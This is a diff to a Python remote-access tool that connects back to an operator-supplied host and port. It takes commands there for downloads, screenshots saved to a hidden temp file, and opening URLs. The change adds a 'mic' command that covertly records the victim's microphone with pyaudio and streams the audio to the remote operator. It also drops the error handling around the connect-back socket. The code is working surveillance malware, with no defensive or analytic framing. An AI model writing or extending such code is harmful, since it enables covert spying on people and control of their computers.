@@ -15,7 +15,9 @@ import subprocess
 import os
 import sys
 import platform
+import platform
 import getpass
+import pyaudio
 
 from time import sleep
 import webbrowser as browser
@@ -28,9 +30,6 @@ if len(sys.argv) != 3:
 
 RHOST = sys.argv[1]
 RPORT = int(sys.argv[2])
-
-def check_root():
-    return os.getuid == 0
 
 class handler:
     def __init__(self,sock):
@@ -99,6 +98,29 @@ def openurl(command):
     url = "".join(command.split("openurl")).strip()
     browser.open(url)
 
+def listen_audio():
+    CHUNK = 1024 * 4
+    FORMAT = pyaudio.paInt16
+    CHANNELS = 2
+    RATE = 44100
+    p = pyaudio.PyAudio()
+    stream = p.open(format=FORMAT,
+                    channels=CHANNELS,
+                    rate=RATE,
+                    input=True,
+                    frames_per_buffer=CHUNK)
+
+    while True:
+        cont = unicorn.recv().decode("UTF-8", "ignore").strip()
+        if cont == "continue":
+            try:
+                data = stream.read(CHUNK)
+                unicorn.send(data)
+            except:
+                break
+        else:
+            break
+
 def screenshot():
     image = ImageGrab.grab()
     image.save("/tmp/.temp_screenshot.png", 'PNG')
@@ -126,6 +148,8 @@ def shell(handler=handler):
                 download(command)
             elif ui[0] == "screenshot":
                 screenshot()
+            elif ui[0] == "mic":
+                listen_audio()
             elif ui[0] == "exit":
                 s.shutdown(2)
                 s.close()
@@ -179,9 +203,6 @@ def shell(handler=handler):
                 unicorn.send((E+"Unrecognized command!").encode())
     sys.exit()
 
-try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((RHOST, RPORT))
-    shell()
-except Exception:
-    sys.exit()
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((RHOST, RPORT))
+shell()
